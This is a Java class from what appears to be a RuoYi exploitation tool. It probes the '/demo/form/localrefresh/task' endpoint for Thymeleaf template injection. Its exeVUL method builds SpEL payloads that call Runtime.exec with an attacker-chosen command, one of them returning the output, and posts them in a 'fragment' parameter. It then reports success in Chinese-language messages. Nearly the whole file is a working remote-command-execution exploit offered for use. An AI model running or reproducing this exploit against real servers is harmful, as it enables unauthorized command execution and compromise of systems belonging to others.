package com.ruoyi.ruoyigui.exploit;

import com.ruoyi.ruoyigui.common.BasePayload;
import com.ruoyi.ruoyigui.entity.Result;
import com.ruoyi.ruoyigui.util.CustomHttpClient;

import static com.ruoyi.ruoyigui.util.Tools.fullUrlEncode;

public class ruoyi_localrefresh_task_thymeleaf implements BasePayload {
    @Override
    public Result checkVUL(String url) throws Exception {
        String vul_url = "/demo/form/localrefresh/task";
        try {
            CustomHttpClient req = new CustomHttpClient();
            int status = req.get(url + vul_url).getStatusCode();
            if (status != 404) {
                return new Result(true, "Ruoyi localrefresh task thymeleaf注入，高版本存在误报，请自行判断执行结果！", "[Thymeleaf注入]\nURI:" + vul_url);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Result(false, "Ruoyi localrefresh task thymeleaf注入", null);
    }

    @Override
    public Result exeVUL(String url, String cmd) throws Exception {
        CustomHttpClient req = new CustomHttpClient();
        String vul_uri = url + "/demo/form/localrefresh/task";
        String payload0 = "${T (java.lang.Runtime).getRuntime().exec(\"" + cmd + "\")}";
        String payload1 = "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(\"" + cmd + "\").getInputStream())}";
        String urlEncode_payload0 = "fragment=" + fullUrlEncode(payload0);
        String urlEncode_payload1 = "fragment=" + fullUrlEncode(payload1);
        try {
            CustomHttpClient.HttpResponse res = req.post(vul_uri, urlEncode_payload0);
            if (res.getBody().contains("localrefresh") || res.getStatusCode() == 500|| res.getStatusCode() == 200) {
                return new Result(true, null, "命令执行成功！");
            } else {
                CustomHttpClient.HttpResponse res1 = req.post(vul_uri, urlEncode_payload1);
                if (res1.getBody().contains("localrefresh") || res1.getStatusCode() == 500|| res1.getStatusCode() == 200) {
                    return new Result(true, null, "命令执行成功！");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new Result(false, null, null);
    }

    @Override
    public Result getShell(String url) throws Exception {
        return new Result(false, null, null);
    }
}
